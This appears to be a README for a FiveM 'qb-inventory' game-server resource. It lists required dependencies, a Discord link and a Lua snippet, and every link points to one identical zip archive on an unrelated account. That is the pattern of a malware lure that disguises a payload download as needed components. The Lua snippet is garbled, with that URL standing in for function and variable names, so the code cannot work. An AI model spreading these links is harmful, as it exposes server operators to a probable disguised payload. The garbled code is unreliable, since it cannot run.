# qb-Inventory + [UI]

```
print ("Dont Forget That All Rights For LXR DEV ! 🧾 ")
```

# [Steps:]

# To Avoid The Problems And Cmd Crashes Delete The -main word- --> 'qb-inventory-main' --> 'qb-inventory'

* Download `qb-inventory`
* Drag `qb-inventory` into your scripts folder
* You have to delete the [main] word --> 'qb-inventory-main' --> 'qb-inventory'

-------------------------------------------------------

# [Requirements:]

* [qbcore framework](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip)
* [qb-target](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip)
* [qb-core](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip)
* [qb-logs](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip)
* [qb-traphouse](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip)
* [qb-radio](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip)
* [qb-drugs](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip)
* [qb-shops](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip)

# [Add This Snippet If You Dont Have It In qb-core/server/player:] 👇

function https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip(ids, methodName, handler)
    local idType = type(ids)
    if idType == "number" then
        if ids == -1 then
            for _, v in pairs(https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip) do
                https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip(methodName, handler)
            end
        else
            if not https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip[ids] then return end

            https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip[ids]https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip(methodName, handler)
        end
    elseif idType == "table" and https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip(ids) == "array" then
        for i = 1, #ids do
            https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip(ids[i], methodName, handler)
        end
    end
end

-------------------------------------------------------

# You Can Find Us On :

Our [Discord](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/client/inventory_qb_v3.4.zip) for updates, support.

-------------------------------------------------------

# [Showcase:]


